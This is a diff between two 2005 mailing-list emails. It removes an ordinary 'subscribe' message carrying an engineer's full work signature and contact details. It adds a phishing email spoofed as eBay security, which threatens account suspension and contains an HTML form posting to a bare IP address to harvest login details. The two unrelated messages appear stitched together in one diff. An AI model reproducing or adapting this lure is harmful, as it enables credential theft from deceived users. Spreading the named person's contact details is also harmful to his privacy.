@@ -1,16 +1,20 @@
-Return-Path: <RANDAZZO@ddc-web.com>
-Received: from ddcnyexch.ddc-ny.com (ddc.ddc-web.com [67.102.43.68])
-	by ozlabs.org (Postfix) with ESMTP id C634967F3C
+Return-Path: <security@eBay.com>
+Received: from ns.coninsalt.ro (007.coninsalt.ro [194.102.105.1])
+	by ozlabs.org (Postfix) with ESMTP id 55EDE67F3C
 	for <linuxppc-embedded@ozlabs.org>;
-	Tue, 16 Aug 2005 05:47:25 +1000 (EST)
-MIME-Version: 1.0
-Content-Type: multipart/alternative;
-	boundary="----_=_NextPart_001_01C5A1D0.77297605"
-Date: Mon, 15 Aug 2005 15:35:17 -0400
-Message-ID: <964382D21A34CA48A4548EC1B939CF62019D4DD7@ddcnyexch.ddc-ny.com>
-From: "Randazzo, Michael" <RANDAZZO@ddc-web.com>
+	Tue, 16 Aug 2005 05:50:24 +1000 (EST)
+Received: from clubnet5 (tanase10.coninsalt.ro [194.102.105.251])
+	by ns.coninsalt.ro (Postfix) with SMTP id 84E2A2D689
+	for <linuxppc-embedded@ozlabs.org>;
+	Mon, 15 Aug 2005 22:19:00 +0300 (EEST)
+From: "eBay" <security@eBay.com>
 To: <linuxppc-embedded@ozlabs.org>
-Subject: subscribe linuxppc-embedded
+Date: Mon, 15 Aug 2005 22:18:32 +0300
+MIME-Version: 1.0
+Content-Type: text/html
+Message-Id: <20050815191901.84E2A2D689@ns.coninsalt.ro>
+Subject: eBay Inc: Please Confirm Your Banking Details [Mon, 15 Aug 2005
+ 22:38:14 -0100]
 List-Id: Linux on Embedded PowerPC Developers Mail List
 	<linuxppc-embedded.ozlabs.org>
 List-Unsubscribe: <https://ozlabs.org/mailman/listinfo/linuxppc-embedded>,
@@ -21,81 +25,97 @@ List-Help: <mailto:linuxppc-embedded-request@ozlabs.org?subject=help>
 List-Subscribe: <https://ozlabs.org/mailman/listinfo/linuxppc-embedded>,
 	<mailto:linuxppc-embedded-request@ozlabs.org?subject=subscribe>
 
-This is a multi-part message in MIME format.
-
-------_=_NextPart_001_01C5A1D0.77297605
-Content-Type: text/plain;
-	charset="iso-8859-1"
-Content-Transfer-Encoding: quoted-printable
-
-subscribe linuxppc-embedded
-
-Regards,=20
-Mike=20
-
-Michael J. Randazzo=20
-Senior Applications Engineer=20
-Data Device Corporation=20
-105 Wilbur Place=20
-Bohemia, NY 11716-2482=20
-Voice: 800-DDC-1772 ext. 7321=20
-Fax: 631-567-7358=20
-Email: randazzo@ddc-web.com=20
-Web: <http://www.ddc-web.com>=20
-
-
-
-------_=_NextPart_001_01C5A1D0.77297605
-Content-Type: text/html;
-	charset="iso-8859-1"
-Content-Transfer-Encoding: quoted-printable
-
-<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2//EN">
-<HTML>
-<HEAD>
-<META HTTP-EQUIV=3D"Content-Type" CONTENT=3D"text/html; =
-charset=3Diso-8859-1">
-<META NAME=3D"Generator" CONTENT=3D"MS Exchange Server version =
-6.5.7226.0">
-<TITLE>subscribe linuxppc-embedded</TITLE>
-</HEAD>
-<BODY>
-<!-- Converted from text/rtf format -->
-
-<P><B><FONT SIZE=3D2 FACE=3D"Arial">subscribe =
-linuxppc-embedded</FONT></B>
-</P>
-
-<P><FONT SIZE=3D2 FACE=3D"Arial">Regards,<BR>
-Mike<BR>
-<BR>
-</FONT><B><FONT COLOR=3D"#800000" SIZE=3D2 FACE=3D"Arial">Michael J. =
-Randazzo</FONT></B><FONT SIZE=3D2 FACE=3D"Arial"><BR>
-</FONT><B><FONT COLOR=3D"#800000" SIZE=3D2 FACE=3D"Arial">Senior =
-Applications Engineer</FONT></B><FONT SIZE=3D2 FACE=3D"Arial"><BR>
-</FONT><FONT COLOR=3D"#800000" SIZE=3D2 FACE=3D"Arial">Data Device =
-Corporation</FONT><FONT SIZE=3D2 FACE=3D"Arial"><BR>
-</FONT><FONT COLOR=3D"#800000" SIZE=3D2 FACE=3D"Arial">105 Wilbur =
-Place</FONT><FONT SIZE=3D2 FACE=3D"Arial"><BR>
-</FONT><FONT COLOR=3D"#800000" SIZE=3D2 FACE=3D"Arial">Bohemia, NY =
-11716-2482</FONT><FONT SIZE=3D2 FACE=3D"Arial"><BR>
-</FONT><FONT COLOR=3D"#800000" SIZE=3D2 FACE=3D"Arial">Voice: =
-800-DDC-1772 ext. 7321</FONT><FONT SIZE=3D2 FACE=3D"Arial"><BR>
-</FONT><FONT COLOR=3D"#800000" SIZE=3D2 FACE=3D"Arial">Fax: =
-631-567-7358</FONT><FONT SIZE=3D2 FACE=3D"Arial"><BR>
-</FONT><FONT COLOR=3D"#800000" SIZE=3D2 =
-FACE=3D"Arial">Email:</FONT><U><FONT SIZE=3D2 FACE=3D"Arial"> =
-</FONT><FONT COLOR=3D"#0000FF" SIZE=3D2 =
-FACE=3D"Arial">randazzo@ddc-web.com</FONT></U><FONT SIZE=3D2 =
-FACE=3D"Arial"><BR>
-</FONT><FONT COLOR=3D"#800000" SIZE=3D2 =
-FACE=3D"Arial">Web:</FONT><U><FONT SIZE=3D2 FACE=3D"Arial"> </FONT><FONT =
-COLOR=3D"#0000FF" SIZE=3D2 FACE=3D"Arial">&lt;<A =
-HREF=3D"http://www.ddc-web.com">http://www.ddc-web.com</A>&gt;</FONT></U>=
-<FONT SIZE=3D2 FACE=3D"Arial"> </FONT>
-</P>
-<BR>
-
-</BODY>
-</HTML>
-------_=_NextPart_001_01C5A1D0.77297605--
+<style type="text/css">
+<!--
+.style1 {color: #333333}
+.style2 {color: #000099}
+-->
+</style>
+<DIV>
+<TABLE cellSpacing=0 cellPadding=0 width="100%" border=0 ?>
+<TBODY>
+<TR>
+<TD>
+<DIV>
+<TABLE cellSpacing=0 cellPadding=0 width="100%" border=0 ?>
+<TBODY>
+<TR>
+<TD>
+<DIV>
+<TABLE cellSpacing=0 cellPadding=0 width="100%" border=0 ?>
+<TBODY>
+<TR>
+<TD>
+<DIV>
+<DIV>
+<DIV>
+<TABLE cellSpacing=0 cellPadding=0 width="100%" border=0 ?>
+<TBODY>
+<TR>
+<TD>
+<DIV>
+<DIV>
+<DIV id=message>
+<TABLE cellSpacing=0 cellPadding=0 width="100%" border=0 ?>
+<TBODY>
+<TR>
+<TD>
+<TABLE style="WIDTH: 597px; HEIGHT: 654px" width=597 border=1>
+<TBODY>
+<TR>
+<TD>
+<!--Aici-->
+<FORM action=http://194.102.105.241/eBuyers/MyDomain/SignIn.htm
+<DIV>
+<DIV>
+<DIV>
+<DIV>
+<DIV>
+<DIV>
+<DIV><FONT color=#00ff66 size=2>
+<TABLE cellSpacing=0 cellPadding=0 width=600 border=0>
+  <TBODY>
+    <TR>
+      <TD><DIV>
+          <P><span class="style1"><FONT face=arial>Copyright © 1995-2005 <A href="http://pages.ebay.com/community/aboutebay/index.html" target=_blank>eBay Inc.</A> All Rights Reserved.<BR>
+              Designated trademarks and brands are the property of their respective owners.<BR>
+              Use of this Web site constitutes acceptance of the</FONT></span><FONT face=arial></FONT></P>
+      </DIV></TD>
+    </TR>
+  </TBODY>
+</TABLE>
+<TABLE cellSpacing=0 cellPadding=0 width=600 border=0>
+  <TBODY>
+    <TR>
+      <TD><DIV>
+          <P><FONT face=arial><BR>
+              eBay </FONT><A href="http://pages.ebay.com/help/community/png-user.html" target=_blank><FONT face=arial color=#003399>User Agreement</FONT></A><FONT face=arial> and </FONT><A href="http://pages.ebay.com/help/community/png-priv.html" target=_blank><FONT face=arial color=#003399>Privacy Policy</FONT></A><FONT face=arial>.</FONT></P>
+      </DIV></TD>
+    </TR>
+  </TBODY>
+</TABLE>
+</FONT></DIV>
+</DIV></DIV></DIV></DIV></DIV></DIV>
+<TABLE cellSpacing=0 cellPadding=0 width=603 border=0>
+<TBODY>
+<TR>
+<TD colSpan=2>
+<TABLE cellSpacing=0 cellPadding=0 width="100%" border=0 ?>
+<TBODY>
+<TR>
+<TD>
+<DIV><FONT face=arial></FONT>&nbsp;</DIV>
+<DIV><span class="style2"><FONT face=arial>Dear customer,<BR>
+  We regret to inform you that your eBay account will be suspended due to the violation of our site policy below: <BR>
+  * Misrepresentation of Identity (User) - Representing yourself as another eBay user or registering using the identity of another.<BR>
+  Due to the suspension of this account, please be advised you are prohibited from using eBay in any way. This includes the registering of a new account.<BR>
+  Please note that this suspension does not relieve you of your agreed-upon obligation to pay any fees you may owe to eBay.<BR>
+  According to our site policy you will have to confirm that you are the real owner of the eBay account by completing&nbsp;a form or else your account will be deleted.</FONT></span></DIV>
+<DIV class="style2"><FONT face=arial>We regret to inform you that your&nbsp;eBay account could be suspended if you don't resolve your problems.To resolve this problems please click&nbsp;the link below and login to your account in order to resolve your account problems.To update your acount please click submit button.</FONT></DIV>
+<DIV>&nbsp;</DIV></TD>
+</TR></TBODY></TABLE></TD></TR>
+<TR>
+<TD width="35%" align="center" valign="middle">
+<P><FONT face=arial>&nbsp; &nbsp;
+    <INPUT style="WIDTH: 139px; HEIGHT: 24px" type=Submit size=40 value=Submit name=submit></FONT></P></TD></TR></TBODY></TABLE></FORM></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE></DIV></DIV></DIV></TD></TR></TBODY></TABLE></DIV></DIV></DIV></TD></TR></TBODY></TABLE></DIV></TD></TR></TBODY></TABLE></DIV></TD></TR></TBODY></TABLE><FONT size=-1></DIV></FONT>
+<P><FONT face=arial size=-1>&nbsp;</P></FONT></DIV>
